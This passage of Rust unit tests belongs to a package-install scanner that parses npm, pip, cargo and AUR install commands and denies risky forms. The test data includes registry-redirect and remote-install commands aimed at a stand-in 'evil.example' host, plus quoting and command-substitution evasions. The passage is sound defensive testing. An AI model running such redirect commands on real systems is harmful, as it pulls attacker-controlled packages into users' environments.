        assert!(refs[0].parseable);
        assert!(!refs[1].parseable);
        assert_eq!(refs[1].spec, "");
    }

    #[test]
    fn unpinned_range_is_not_pinned() {
        let refs = npm_refs("postinstall", "npm install left-pad@^1.3.0");
        assert_eq!(refs.len(), 1);
        assert!(!refs[0].pinned);
        assert_eq!(refs[0].registry_spec(), Some(("left-pad", Some("^1.3.0"))));
    }

    #[test]
    fn empty_version_part_reads_unpinned_not_broken() {
        let refs = npm_refs("postinstall", "npm install pkg@");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].registry_spec(), Some(("pkg", None)));
        let refs = npm_refs("postinstall", "pip install requests==");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].registry_spec(), Some(("requests", None)));
    }

    #[test]
    fn pip_install_in_wheel_data_script() {
        let dir = tempfile::tempdir().unwrap();
        let path = "pkg-1.0.data/scripts/setup-deps";
        std::fs::create_dir_all(dir.path().join("pkg-1.0.data/scripts")).unwrap();
        std::fs::write(
            dir.path().join(path),
            "#!/bin/sh\npip install requests==2.31.0\n",
        )
        .unwrap();
        let delta = crate::diff::Delta {
            baseline_version: None,
            target_version: "1.0.0".into(),
            files_added: vec![crate::diff::FileChange {
                relative_path: path.to_string(),
                ..Default::default()
            }],
            ..Default::default()
        };
        let refs = from_wheel_data_scripts(dir.path(), &delta);
        assert_eq!(refs.len(), 1);
        let r = &refs[0];
        assert_eq!(r.manager, RefManager::Pip);
        assert_eq!(r.spec, "requests==2.31.0");
        assert!(r.pinned);
        assert_eq!(r.registry_spec(), Some(("requests", Some("2.31.0"))));
        assert_eq!(
            r.origin,
            RefOrigin::WheelDataScript {
                path: path.to_string()
            }
        );
    }

    #[test]
    fn wheel_scanner_scans_modified_files_too() {
        let dir = tempfile::tempdir().unwrap();
        let path = "pkg-1.0.data/scripts/setup-deps";
        std::fs::create_dir_all(dir.path().join("pkg-1.0.data/scripts")).unwrap();
        std::fs::write(dir.path().join(path), "pip install requests==2.31.0\n").unwrap();
        let delta = crate::diff::Delta {
            baseline_version: None,
            target_version: "1.0.0".into(),
            files_modified: vec![crate::diff::FileChange {
                relative_path: path.to_string(),
                ..Default::default()
            }],
            ..Default::default()
        };
        let refs = from_wheel_data_scripts(dir.path(), &delta);
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].spec, "requests==2.31.0");
    }

    #[test]
    fn pip_requirement_files_are_not_package_specs() {
        let refs = npm_refs("postinstall", "pip install -r requirements.txt");
        assert!(refs.is_empty());
        let refs = npm_refs("postinstall", "pip install -e .");
        assert!(refs.is_empty());
    }

    #[test]
    fn pip_non_digit_version_is_unpinned() {
        let refs = npm_refs("postinstall", "pip install pkg==beta1");
        assert_eq!(refs.len(), 1);
        assert!(!refs[0].pinned);
        assert_eq!(refs[0].registry_spec(), Some(("pkg", Some("beta1"))));
    }

    #[test]
    fn unreadable_wheel_data_script_is_disclosed_unparseable() {
        let dir = tempfile::tempdir().unwrap();
        let path = "pkg-1.0.data/scripts/binary-tool";
        std::fs::create_dir_all(dir.path().join("pkg-1.0.data/scripts")).unwrap();
        std::fs::write(dir.path().join(path), [0xff, 0xfe, 0x00, 0x01]).unwrap();
        let delta = crate::diff::Delta {
            baseline_version: None,
            target_version: "1.0.0".into(),
            files_added: vec![crate::diff::FileChange {
                relative_path: path.to_string(),
                ..Default::default()
            }],
            ..Default::default()
        };
        let refs = from_wheel_data_scripts(dir.path(), &delta);
        assert_eq!(refs.len(), 1);
        assert!(!refs[0].parseable);
        assert_eq!(refs[0].spec, "");
    }

    #[test]
    fn wheel_scanner_ignores_non_data_script_paths() {
        let dir = tempfile::tempdir().unwrap();
        let delta = crate::diff::Delta {
            baseline_version: None,
            target_version: "1.0.0".into(),
            files_added: vec![crate::diff::FileChange {
                relative_path: "bin/pip-install-everything".to_string(),
                ..Default::default()
            }],
            ..Default::default()
        };
        assert!(from_wheel_data_scripts(dir.path(), &delta).is_empty());
    }

    #[test]
    fn registry_spec_rejects_non_registry_shapes() {
        let mut r = InstallRef {
            origin: RefOrigin::NpmLifecycle {
                script: "postinstall".into(),
            },
            manager: RefManager::Npm,
            spec: "github:user/repo#abc".into(),
            pinned: false,
            parseable: true,
        };
        assert_eq!(r.registry_spec(), None);
        r.spec = "https://evil.example/x.tgz".into();
        assert_eq!(r.registry_spec(), None);
        r.spec = "../escape".into();
        assert_eq!(r.registry_spec(), None);
        r.spec = "UPPER/case".into();
        assert_eq!(r.registry_spec(), None);
        r.spec = "@scope/pkg@1.2.3".into();
        assert_eq!(r.registry_spec(), Some(("@scope/pkg", Some("1.2.3"))));
        r.manager = RefManager::Pip;
        r.spec = "requests==2.31.0".into();
        assert_eq!(r.registry_spec(), Some(("requests", Some("2.31.0"))));
        r.spec = "my_pkg".into();
        assert_eq!(r.registry_spec(), Some(("my_pkg", None)));
    }

    #[test]
    fn gate_hard_denies_pip_non_registry_shapes() {
        let denies = gate_hard_denies("pip install -r https://evil.example/x.txt");
        assert_eq!(denies.len(), 1, "{denies:?}");
        assert!(denies[0].contains("-r"));
        assert!(gate_hard_denies("pip3 install -e git+https://x").len() == 1);
        assert!(gate_hard_denies("pip install requests==2.31.0").is_empty());
        assert!(gate_hard_denies("pip install -q requests").is_empty());
    }

    #[test]
    fn gate_hard_denies_quoted_and_escaped_managers() {
        for line in [
            "\"npm\" install evil-pkg",
            "'npm' install evil-pkg",
            "\\npm install evil-pkg",
        ] {
            let denies = gate_hard_denies(line);
            assert_eq!(denies.len(), 1, "{line}: {denies:?}");
        }
        assert!(gate_hard_denies("npm install evil-pkg").is_empty());
        assert!(gate_hard_denies("echo $(date) && npm install ok-pkg").is_empty());
    }

    #[test]
    fn gate_hard_denies_quoted_cargo_yay_paru_bunx() {
        for line in [
            "\"cargo\" install evil-crate",
            "'cargo' install evil-crate",
            "\\cargo install evil-crate",
            "\"yay\" -S evil-pkg",
            "'paru' -S evil-pkg",
            "\"bunx\" evil-pkg",
            "$(cargo install evil-crate)",
        ] {
            let denies = gate_hard_denies(line);
            assert!(
                !denies.is_empty(),
                "{line}: quoted manager must deny, never silent allow"
            );
        }
        assert!(gate_hard_denies("cargo install evil-crate").is_empty());
    }

    #[test]
    fn continuation_joining_yields_ref_or_disclosure() {
        for (script, manager, spec) in [
            ("postinstall", RefManager::Npm, "evil-pkg"),
            ("preinstall", RefManager::Npm, "evil-pkg"),
        ] {
            let refs = npm_refs(script, "npm \\\n install evil-pkg");
            assert!(
                refs.iter().any(|r| r.manager == manager && r.spec == spec)
                    || refs.iter().any(|r| !r.parseable),
                "split invocation must yield a ref or a disclosure: {refs:?}"
            );
        }
        let refs = npm_refs("postinstall", "pip \\\n install requests==2.31.0");
        assert!(
            refs.iter().any(|r| r.spec == "requests==2.31.0") || refs.iter().any(|r| !r.parseable),
            "split pip invocation must yield a ref or a disclosure: {refs:?}"
        );
    }

    #[test]
    fn wheel_continuation_joining_yields_ref_or_disclosure() {
        let dir = tempfile::tempdir().unwrap();
        let path = "pkg-1.0.data/scripts/setup-deps";
        std::fs::create_dir_all(dir.path().join("pkg-1.0.data/scripts")).unwrap();
        std::fs::write(dir.path().join(path), "pip \\\n install requests==2.31.0\n").unwrap();
        let delta = crate::diff::Delta {
            baseline_version: None,
            target_version: "1.0.0".into(),
            files_added: vec![crate::diff::FileChange {
                relative_path: path.to_string(),
                ..Default::default()
            }],
            ..Default::default()
        };
        let refs = from_wheel_data_scripts(dir.path(), &delta);
        assert!(
            refs.iter().any(|r| r.spec == "requests==2.31.0") || refs.iter().any(|r| !r.parseable),
            "split wheel invocation must yield a ref or a disclosure: {refs:?}"
        );
    }

    #[test]
    fn scanner_captures_npx_package_flag_and_exec_verbs() {
        let refs = scan_line("npx --package=evil-pkg serve");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].1, "evil-pkg");
        // The space form must capture the value, not swallow it.
        let refs = scan_line("npx --package evil-pkg");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].1, "evil-pkg");
        let refs = scan_line("npm exec --package=evil-pkg -- ls");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].1, "evil-pkg");
        let refs = scan_line("npm exec evil-pkg -- --flag");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].1, "evil-pkg");
        let refs = scan_line("bun x malcontent");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].1, "malcontent");
    }

    #[test]
    fn scanner_finds_verbs_behind_leading_global_flags() {
        for line in [
            "npm --no-fund install evil-pkg",
            "npm --no-audit --loglevel warn install evil-pkg",
            "npm --registry=https://evil.example install evil-pkg",
            "npm -p evil-pkg exec ls",
            "npm --package=evil-pkg exec ls",
        ] {
            let refs = scan_line(line);
            assert!(
                refs.iter().any(|(_, s)| s == "evil-pkg"),
                "{line} must surface the named package: {refs:?}"
            );
        }
    }

    #[test]
    fn comment_tail_is_not_scanned() {
        let refs = scan_line("npm install evil-pkg # npm install ok-pkg");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].1, "evil-pkg");
        assert!(scan_line("# npm install evil-pkg").is_empty());
    }

    #[test]
    fn gate_hard_denies_dynamic_package_flag_values_and_env_overrides() {
        // A dynamic --package value must surface as an unparseable marker,
        // never silently dropped behind the decoy positional.
        let refs = scan_line("npx --package $EVIL serve");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].1, "");
        let refs = scan_line("npm --package=$EVIL exec ls");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].1, "");
        // Env-assignment and config-set registry redirects are hard denies.
        assert!(
            gate_hard_denies("npm_config_registry=https://evil.example npm install y").len() == 1
        );
        assert!(
            gate_hard_denies("npm config set registry https://evil.example && npm install y").len()
                == 1
        );
        assert!(gate_hard_denies("npm install y --tag=poisoned").len() == 1);
        assert!(gate_hard_denies("npm --tag poisoned install y").len() == 1);
    }

    #[test]
    fn gate_hard_denies_npm_registry_overrides() {
        assert!(gate_hard_denies("npm install x --registry https://evil.example").len() == 1);
        assert!(gate_hard_denies("npm --registry=https://evil.example install x").len() == 1);
        assert!(gate_hard_denies("npm install x --userconfig /tmp/rc").len() == 1);
        assert!(gate_hard_denies("npm install x").is_empty());
        assert!(gate_hard_denies("npm ls").is_empty());
    }

    #[test]
    fn gate_hard_denies_survive_flag_ordering_and_substitution() {
        assert!(gate_hard_denies("pip install --quiet -r requirements.txt").len() == 1);
        assert!(gate_hard_denies("pip install pkg -r other.txt").len() == 1);
        assert!(gate_hard_denies("echo $(npm install evil-pkg)").len() == 1);
        assert!(gate_hard_denies("echo `npm install evil-pkg`").len() == 1);
        // A substitution that names no manager stays the scanner's business.
        assert!(gate_hard_denies("echo $(date) && npm install ok-pkg").is_empty());
    }

    #[test]
    fn npm_segment_grammar_matches_registry_rules() {
        let mut r = InstallRef {
            origin: RefOrigin::NpmLifecycle {
                script: "postinstall".into(),
            },
            manager: RefManager::Npm,
            spec: String::new(),
            pinned: false,
            parseable: true,
        };
        for rejected in ["~pkg", "_pkg", ".pkg", "..", "."] {
            r.spec = rejected.to_string();
            assert_eq!(r.registry_spec(), None, "`{rejected}` must be rejected");
        }
        for accepted in ["pkg", "pkg.name", "pkg_name", "pkg-name"] {
            r.spec = accepted.to_string();
            assert_eq!(
                r.registry_spec(),
                Some((accepted, None)),
                "`{accepted}` must be accepted"
            );
        }
    }

    #[test]
    fn comma_and_semicolon_tail_is_trimmed() {
        let refs = npm_refs("postinstall", "npm install pkg,");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].spec, "pkg");
    }

    #[test]
    fn pnpm_dlx_and_pip3_shapes() {
        let refs = npm_refs(
            "postinstall",
            "pnpm dlx malcontent && pip3 install evil-pkg",
        );
        assert_eq!(refs.len(), 2);
        assert_eq!(refs[0].manager, RefManager::Pnpm);
        assert_eq!(refs[0].spec, "malcontent");
        assert_eq!(refs[1].manager, RefManager::Pip);
        assert_eq!(refs[1].spec, "evil-pkg");
    }

    #[test]
    fn scanner_matches_absolute_and_quoted_manager_paths() {
        for (line, manager, spec) in [
            ("/usr/bin/npm install evil-pkg", RefManager::Npm, "evil-pkg"),
            ("/usr/local/bin/npx evil-pkg", RefManager::Npx, "evil-pkg"),
            ("/usr/bin/pip install requests", RefManager::Pip, "requests"),
            (
                "/usr/local/bin/pip3 install requests",
                RefManager::Pip,
                "requests",
            ),
            (
                "\"/usr/bin/npm\" install evil-pkg",
                RefManager::Npm,
                "evil-pkg",
            ),
            (
                "'/usr/bin/pip' install requests",
                RefManager::Pip,
                "requests",
            ),
            ("\\npm install evil-pkg", RefManager::Npm, "evil-pkg"),
            (
                "C:\\tools\\npm install evil-pkg",
                RefManager::Npm,
                "evil-pkg",
            ),
        ] {
            let refs = scan_line(line);
            assert!(
                refs.iter().any(|(m, s)| *m == manager && s == spec),
                "{line} must surface {manager:?} {spec}: {refs:?}"
            );
        }
    }

    #[test]
    fn gate_shapes_fire_behind_absolute_manager_paths() {
        assert!(gate_hard_denies("/usr/bin/npm install evil-pkg").is_empty());
        assert!(
            gate_hard_denies("/usr/bin/npm install x --registry https://evil.example").len() == 1
        );
        assert!(gate_hard_denies("/usr/bin/pip install -r requirements.txt").len() == 1);
        assert!(gate_hard_denies("/usr/local/bin/npx --package=evil-pkg serve").is_empty());
        let refs = scan_line("/usr/local/bin/npx --package=evil-pkg serve");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].1, "evil-pkg");
    }

    #[test]
    fn gate_denies_quoted_absolute_manager_tokens() {
        for line in [
            "\"/usr/bin/npm\" install evil-pkg",
            "'/usr/bin/pip' install requests",
            "\"/usr/local/bin/npx\" evil-pkg",
        ] {
            let denies = gate_hard_denies(line);
            assert!(
                denies.iter().any(|d| d.contains("hidden behind quoting")),
                "{line} must deny as hidden: {denies:?}"
            );
        }
        assert!(
            gate_hard_denies("/usr/bin/npm install evil-pkg")
                .iter()
                .all(|d| !d.contains("hidden behind quoting"))
        );
    }

    #[test]
    fn gate_denies_inline_registry_redirect_assignments() {
        for line in [
            "PIP_INDEX_URL=https://evil.example pip install requests",
            "PIP_EXTRA_INDEX_URL=https://evil.example pip install requests",
            "PIP_CONFIG_FILE=/tmp/pip.conf pip install requests",
            "NPM_CONFIG_REGISTRY=https://evil.example npm install y",
            "npm_config_registry=https://evil.example npm install y",
            "CARGO_REGISTRIES_CRATES_IO_PROTOCOL=sparse cargo install foo",
            "cargo_net_offline=true cargo install foo",
        ] {
            let denies = gate_hard_denies(line);
            assert_eq!(denies.len(), 1, "{line}: {denies:?}");
        }
        assert!(gate_hard_denies("pip install requests==2.31.0").is_empty());
        assert!(gate_hard_denies("npm install y").is_empty());
        assert!(gate_hard_denies("cargo install foo").is_empty());
        assert!(gate_hard_denies("PIP_INDEX_URL=https://evil.example echo hi").is_empty());
    }

    #[test]
    fn gate_denies_npmrc_references() {
        assert!(!gate_hard_denies("npm install x --userconfig .npmrc").is_empty());
        assert!(!gate_hard_denies("npm --userconfig=.npmrc install x").is_empty());
    }

    #[test]
    fn redirect_env_names_cover_registry_redirect_families() {
        assert!(is_redirect_env_name("PIP_INDEX_URL"));
        assert!(is_redirect_env_name("PIP_EXTRA_INDEX_URL"));
        assert!(is_redirect_env_name("PIP_CONFIG_FILE"));
        assert!(is_redirect_env_name("pip_quiet"));
        assert!(is_redirect_env_name("NPM_CONFIG_REGISTRY"));
        assert!(is_redirect_env_name("npm_config_auth_token"));
        assert!(is_redirect_env_name("CARGO_REGISTRIES_CRATES_IO_PROTOCOL"));
        assert!(is_redirect_env_name("CARGO_NET_OFFLINE"));
        assert!(!is_redirect_env_name("PATH"));
        assert!(!is_redirect_env_name("BLUELINE_POLICY"));
        let hits: Vec<String> = redirect_env_present(
            ["PATH", "PIP_INDEX_URL", "HOME", "NPM_CONFIG_REGISTRY"]
                .iter()
                .copied(),
        );
        assert_eq!(hits, vec!["NPM_CONFIG_REGISTRY", "PIP_INDEX_URL"]);
    }

    #[test]
    fn every_manager_maps_to_its_registry() {
        use crate::registry::Ecosystem;
        assert_eq!(RefManager::Npm.ecosystem(), Ecosystem::Npm);
        assert_eq!(RefManager::Npx.ecosystem(), Ecosystem::Npm);
        assert_eq!(RefManager::Pnpm.ecosystem(), Ecosystem::Npm);
        assert_eq!(RefManager::Yarn.ecosystem(), Ecosystem::Npm);
        assert_eq!(RefManager::Bun.ecosystem(), Ecosystem::Npm);
        assert_eq!(RefManager::Bunx.ecosystem(), Ecosystem::Npm);
        assert_eq!(RefManager::Pip.ecosystem(), Ecosystem::PyPi);
        assert_eq!(RefManager::Cargo.ecosystem(), Ecosystem::Cargo);
        assert_eq!(RefManager::Yay.ecosystem(), Ecosystem::Aur);
        assert_eq!(RefManager::Paru.ecosystem(), Ecosystem::Aur);
    }

    fn word_toks(words: &[&str]) -> Vec<Tok> {
        words
            .iter()
            .map(|w| {
                let (lower, ends_command, is_separator) = strip_token(&w.to_lowercase());
                let (raw, _, _) = strip_token(w);
                Tok {
                    lower,
                    raw,
                    ends_command,
                    is_separator,
                }
            })
            .collect()
    }

    fn command_ref(manager: RefManager, spec: &str, parseable: bool) -> InstallRef {
        InstallRef {
            origin: RefOrigin::CommandLine,
            manager,
            spec: spec.to_string(),
            pinned: false,
            parseable,
        }
    }

    #[test]
    fn every_manager_label_is_exact() {
        for (manager, label) in [
            (RefManager::Npm, "npm"),
            (RefManager::Npx, "npx"),
            (RefManager::Pnpm, "pnpm"),
            (RefManager::Yarn, "yarn"),
            (RefManager::Bun, "bun"),
            (RefManager::Bunx, "bunx"),
            (RefManager::Pip, "pip"),
            (RefManager::Cargo, "cargo"),
            (RefManager::Yay, "yay"),
            (RefManager::Paru, "paru"),
        ] {
            assert_eq!(manager.label(), label, "{manager:?} label must be exact");
        }
    }

    #[test]
    fn registry_spec_requires_parseable_and_nonempty() {
        assert_eq!(
            command_ref(RefManager::Npm, "evil-pkg", true).registry_spec(),
            Some(("evil-pkg", None))
        );
        assert_eq!(
            command_ref(RefManager::Npm, "evil-pkg", false).registry_spec(),
            None
        );
        assert_eq!(command_ref(RefManager::Npm, "", true).registry_spec(), None);
        assert_eq!(
            command_ref(RefManager::Npm, "", false).registry_spec(),
            None
        );
    }

    #[test]
    fn registry_spec_pip_gate_uses_py_names() {
        assert_eq!(
            command_ref(RefManager::Pip, "requests==2.31.0", true).registry_spec(),
            Some(("requests", Some("2.31.0")))
        );
        assert_eq!(
            command_ref(RefManager::Pip, "Requests", true).registry_spec(),
            Some(("Requests", None))
        );
        assert_eq!(
            command_ref(RefManager::Pip, "bad name!", true).registry_spec(),
            None
        );
        assert_eq!(
            command_ref(RefManager::Pip, "@scope/pkg", true).registry_spec(),
            None
        );
    }

    #[test]
    fn registry_spec_aur_gate_uses_aur_names() {
        assert_eq!(
            command_ref(RefManager::Yay, "foo", true).registry_spec(),
            Some(("foo", None))
        );
        assert_eq!(
            command_ref(RefManager::Yay, "foo=1.0", true).registry_spec(),
            Some(("foo", Some("1.0")))
        );
        assert_eq!(
            command_ref(RefManager::Paru, "foo", true).registry_spec(),
            Some(("foo", None))
        );
        assert_eq!(
            command_ref(RefManager::Yay, "foo/bar", true).registry_spec(),
            None
        );
        assert_eq!(
            command_ref(RefManager::Yay, "@scope/pkg", true).registry_spec(),
            None
        );
        assert_eq!(
            command_ref(RefManager::Paru, "@scope/pkg", true).registry_spec(),
            None
        );
    }

    #[test]
    fn split_spec_aur_equals_shapes() {
        assert_eq!(
            split_spec(RefManager::Yay, "foo=1.0"),
            Some(("foo", Some("1.0")))
        );
        assert_eq!(
            split_spec(RefManager::Paru, "foo=1.0"),
            Some(("foo", Some("1.0")))
        );
        assert_eq!(split_spec(RefManager::Yay, "=1.0"), Some(("=1.0", None)));
        assert_eq!(split_spec(RefManager::Yay, "foo="), Some(("foo=", None)));
        assert_eq!(split_spec(RefManager::Yay, "foo"), Some(("foo", None)));
        assert_eq!(
            split_spec(RefManager::Yay, "foo@1.0.0"),
            Some(("foo@1.0.0", None))
        );
    }

    #[test]
    fn split_spec_npm_empty_name_reads_as_bare_spec() {
        assert_eq!(split_spec(RefManager::Npm, "@1.0"), Some(("@1.0", None)));
        assert_eq!(
            split_spec(RefManager::Npm, "pkg@1.2.3"),
            Some(("pkg", Some("1.2.3")))
        );
    }

    #[test]
    fn valid_npm_name_pins_length_boundary() {
        assert!(valid_npm_name(&"a".repeat(214)));
        assert!(!valid_npm_name(&"a".repeat(215)));
        assert!(!valid_npm_name(""));
        assert!(!valid_npm_name("Foo"));
        assert!(!valid_npm_name("foo!bar"));
    }

    #[test]
    fn scoped_npm_gate_needs_at_and_valid_segments() {
        let mut r = command_ref(RefManager::Npm, "@scope/pkg", true);
        assert_eq!(r.registry_spec(), Some(("@scope/pkg", None)));
        r.spec = "scope/pkg".to_string();
        assert_eq!(r.registry_spec(), None);
        r.spec = "@scope/UPPER".to_string();
        assert_eq!(r.registry_spec(), None);
        r.spec = "@UPPER/pkg".to_string();
        assert_eq!(r.registry_spec(), None);
        r.spec = "@scope/".to_string();
        assert_eq!(r.registry_spec(), None);
        r.spec = "@/pkg".to_string();
        assert_eq!(r.registry_spec(), None);
    }

    #[test]
    fn valid_aur_name_pins_grammar_and_length() {
        assert!(valid_aur_name("foo-1.2_3+x@y"));
        assert!(valid_aur_name(&"a".repeat(255)));
        assert!(!valid_aur_name(""));
        assert!(!valid_aur_name(&"a".repeat(256)));
        assert!(!valid_aur_name("foo/bar"));
        assert!(!valid_aur_name("foo bar"));
    }

    #[test]
    fn valid_py_name_pins_grammar_and_length() {
        assert!(valid_py_name("my_pkg"));
        assert!(valid_py_name("Requests"));
        assert!(valid_py_name(&"a".repeat(214)));
        assert!(!valid_py_name(""));
        assert!(!valid_py_name(&"a".repeat(215)));
        assert!(!valid_py_name("foo/bar"));
        assert!(!valid_py_name("bad name!"));
    }

    #[test]
    fn version_exactness_is_per_manager() {
        assert!(version_is_exact(RefManager::Pip, "2.31.0"));
        assert!(version_is_exact(RefManager::Pip, "2.31.0-x1"));
        assert!(!version_is_exact(RefManager::Pip, ">=2.0"));
        assert!(!version_is_exact(RefManager::Pip, ""));
        assert!(version_is_exact(RefManager::Yay, "1.0"));
        assert!(version_is_exact(RefManager::Paru, "1.0-1"));
        assert!(!version_is_exact(RefManager::Yay, ">=1.0"));
        assert!(version_is_exact(RefManager::Npm, "1.2.3"));
        assert!(!version_is_exact(RefManager::Npm, "^1.2.3"));
        assert!(!version_is_exact(RefManager::Npm, ""));
    }

    #[test]
    fn pip_exactness_accepts_non_semver_starts_with_digit() {
        assert!(version_is_exact(RefManager::Pip, "2.31"));
        assert!(version_is_exact(RefManager::Pip, "1.0"));
        assert!(!version_is_exact(RefManager::Npm, "2.31"));
        assert!(!version_is_exact(RefManager::Npm, "1.0"));
        assert!(!version_is_exact(RefManager::Pip, "==2.31"));
    }

    #[test]
    fn scan_line_preserves_raw_spec_casing() {
        let refs = scan_line("pip install Requests==2.31.0");
        assert_eq!(
            refs,
            vec![(RefManager::Pip, "Requests==2.31.0".to_string())]
        );
    }

    #[test]
    fn manager_token_ending_command_is_skipped() {
        assert!(scan_line("npm; install foo").is_empty());
        assert_eq!(
            scan_line("npm install foo"),
            vec![(RefManager::Npm, "foo".to_string())]
        );
    }

    #[test]
    fn flag_walk_stops_at_command_end() {
        assert!(scan_line("npm --registry=x; install evil").is_empty());
        assert_eq!(
            scan_line("npm --registry=https://evil.example install evil-pkg"),
            vec![(RefManager::Npm, "evil-pkg".to_string())]
        );
    }

    #[test]
    fn consumed_flag_values_do_not_become_verbs() {
        assert!(scan_line("npm --registry install evil").is_empty());
        assert_eq!(
            scan_line("npm --registry https://x install evil"),
            vec![(RefManager::Npm, "evil".to_string())]
        );
        assert!(scan_line("npm --tag install evil").is_empty());
    }

    #[test]
    fn multi_command_line_yields_exact_refs() {
        assert_eq!(
            scan_line("npm install a && pip install b"),
            vec![
                (RefManager::Npm, "a".to_string()),
                (RefManager::Pip, "b".to_string()),
            ]
        );
        assert_eq!(
            scan_line("npx --package=evil-pkg serve"),
            vec![(RefManager::Npx, "evil-pkg".to_string())]
        );
    }

    #[test]
    fn repeated_equals_package_flags_yield_each_ref() {
        assert_eq!(
            scan_line("npx --package=a --package=b serve"),
            vec![
                (RefManager::Npx, "a".to_string()),
                (RefManager::Npx, "b".to_string()),
            ]
        );
        assert_eq!(
            scan_line("npx --package=a --package=b --package=c serve"),
            vec![
                (RefManager::Npx, "a".to_string()),
                (RefManager::Npx, "b".to_string()),
                (RefManager::Npx, "c".to_string()),
            ]
        );
    }

    #[test]
    fn chained_managers_across_separators_yield_each_ref() {
        assert_eq!(
            scan_line("npm install a && yay -S foo"),
            vec![
                (RefManager::Npm, "a".to_string()),
                (RefManager::Yay, "foo".to_string()),
            ]
        );
        assert_eq!(
            scan_line("yay -S foo && pip install b"),
            vec![
                (RefManager::Yay, "foo".to_string()),
                (RefManager::Pip, "b".to_string()),
            ]
        );
    }

    #[test]
    fn cargo_yay_paru_verbs_yield_refs() {
        assert_eq!(
            scan_line("cargo install foo"),
            vec![(RefManager::Cargo, "foo".to_string())]
        );
        assert_eq!(
            scan_line("yay -S foo"),
            vec![(RefManager::Yay, "foo".to_string())]
        );
        assert_eq!(
            scan_line("paru -S foo"),
            vec![(RefManager::Paru, "foo".to_string())]
        );
        assert_eq!(
            scan_line("yay --noconfirm -S foo"),
            vec![(RefManager::Yay, "foo".to_string())]
        );
        assert_eq!(
            scan_line("yay pkg -S foo"),
            vec![(RefManager::Yay, "foo".to_string())]
        );
        assert_eq!(
            scan_line("paru pkg -S foo"),
            vec![(RefManager::Paru, "foo".to_string())]
        );
        assert_eq!(
            scan_line("/usr/bin/yay pkg -S foo"),
            vec![(RefManager::Yay, "foo".to_string())]
        );
        assert_eq!(
            scan_line("yay pkg -S foo=1.0"),
            vec![(RefManager::Yay, "foo=1.0".to_string())]
        );
    }

    #[test]
    fn redirect_assignment_shapes() {
        assert!(is_redirect_env_assignment(
            "pip_index_url=https://evil.example"
        ));
        assert!(is_redirect_env_assignment(
            "npm_config_registry=https://evil.example"
        ));
        assert!(is_redirect_env_assignment("cargo_net_offline=true"));
        assert!(!is_redirect_env_assignment("requests"));
        assert!(!is_redirect_env_assignment("foo=bar"));
        assert!(!is_redirect_env_assignment("noequals"));
    }

    #[test]
    fn positionals_space_package_flag_captures_value() {
        let toks = word_toks(&["--package", "evil-pkg"]);
        assert_eq!(
            positionals(&toks, RefManager::Npx, false),
            vec!["evil-pkg".to_string()]
        );
        let toks = word_toks(&["--package", "evil-pkg", "$DYN"]);
        assert_eq!(
            positionals(&toks, RefManager::Npx, false),
            vec!["evil-pkg".to_string()]
        );
        let toks = word_toks(&["--package", "$DYN"]);
        assert!(positionals(&toks, RefManager::Npx, false).is_empty());
        let toks = word_toks(&["--package", "$DYN", "realpkg"]);
        assert!(positionals(&toks, RefManager::Npx, false).is_empty());
    }

    #[test]
    fn positionals_equals_package_flag_captures_value() {
        let toks = word_toks(&["--package=evil-pkg"]);
        assert_eq!(
            positionals(&toks, RefManager::Npx, false),
            vec!["evil-pkg".to_string()]
        );
        let toks = word_toks(&["--package=evil-pkg", "$DYN"]);
        assert_eq!(
            positionals(&toks, RefManager::Npx, false),
            vec!["evil-pkg".to_string()]
        );
    }

    #[test]
    fn plausible_spec_gate() {
        assert!(plausible_spec(RefManager::Npm, "evil-pkg"));
        assert!(!plausible_spec(RefManager::Npm, ""));
        assert!(!plausible_spec(RefManager::Npm, "$EVIL"));
        assert!(plausible_spec(RefManager::Pip, "Requests"));
        assert!(plausible_spec(RefManager::Pip, "requests==2.31.0"));
        assert!(!plausible_spec(RefManager::Pip, "bad name!"));
    }

    #[test]
    fn non_registry_shapes_each_match_alone() {
        for shape in [
            "https://evil.example/x.tgz",
            "git+https://evil.example/x.git",
            "git@github.com:evil/x.git",
            "github:evil/x",
            "gitlab:evil/x",
            "bitbucket:evil/x",
            "./local-dir",
            "../escape",
            "/abs/path",
            "pkg.tgz",
            "pkg.tar.gz",
        ] {
            assert!(non_registry_spec(shape), "{shape} must be non-registry");
        }
        assert!(!non_registry_spec("evil-pkg"));
        assert!(!non_registry_spec("requests==2.31.0"));
        assert!(!non_registry_spec("@scope/pkg"));
    }

    #[test]
    fn non_registry_single_disjunct_shapes_still_match() {
        assert!(non_registry_spec("https://evil.example/pkg"));
        assert!(non_registry_spec("git+evil/pkg"));
        assert!(!non_registry_spec("git"));
        assert!(!non_registry_spec("pkg.tgz.bak"));
    }

    #[test]
    fn scan_text_line_pins_size_boundary() {
        let origin = RefOrigin::CommandLine;
        assert!(scan_text_line(&"x".repeat(MAX_SCAN_LINE_BYTES), &origin).is_empty());
        let disclosed = scan_text_line(&"x".repeat(MAX_SCAN_LINE_BYTES + 1), &origin);
        assert_eq!(disclosed.len(), 1);
        assert!(!disclosed[0].parseable);
        assert_eq!(disclosed[0].spec, "");
        let pad = "x".repeat(MAX_SCAN_LINE_BYTES - "npm install evil-pkg # ".len());
        let refs = scan_text_line(&format!("npm install evil-pkg # {pad}"), &origin);
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].spec, "evil-pkg");
        assert!(refs[0].parseable);
    }

    #[test]
    fn npm_config_set_gate_needs_both_words() {
        assert_eq!(
            gate_hard_denies("npm config set registry https://evil.example").len(),
            1
        );
        assert!(gate_hard_denies("npm config status").is_empty());
        assert!(gate_hard_denies("npm set foo").is_empty());
        assert!(gate_hard_denies("npm --registry https://evil.example").is_empty());
        assert_eq!(
            gate_hard_denies("npm install x --registry https://evil.example").len(),
            1
        );
    }

    #[test]
    fn pip_danger_scan_covers_manager_offset() {
        assert_eq!(
            gate_hard_denies("env pip install -r requirements.txt").len(),
            1
        );
        assert!(gate_hard_denies("sudo pip install requests==1.0").is_empty());
